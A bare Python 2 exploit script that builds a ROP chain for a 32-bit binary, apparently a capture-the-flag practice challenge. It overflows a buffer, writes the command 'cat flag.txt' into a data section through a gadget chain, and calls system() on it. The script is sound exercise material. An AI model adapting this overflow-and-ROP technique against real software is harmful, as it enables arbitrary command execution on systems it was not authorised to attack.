import struct

payload = ""
system = 0x08048430
write = 0x08048670
pop = 0x080486da
data1 = 0x0804a028

payload += "A"*44

payload += struct.pack("I", pop)
payload += struct.pack("I", data1)
payload += "\x63\x61\x74\x20"
payload += struct.pack("I", write)
payload += struct.pack("I", pop)
payload += struct.pack("I", data1+4)
payload += "\x66\x6c\x61\x67"
payload += struct.pack("I", write)
payload += struct.pack("I", pop)
payload += struct.pack("I", data1+8)
payload += "\x2e\x74\x78\x74"
payload += struct.pack("I", write)
payload += struct.pack("I", system)
payload += "\xff\xff\xff\xff"
payload += struct.pack("I", data1)
print payload 
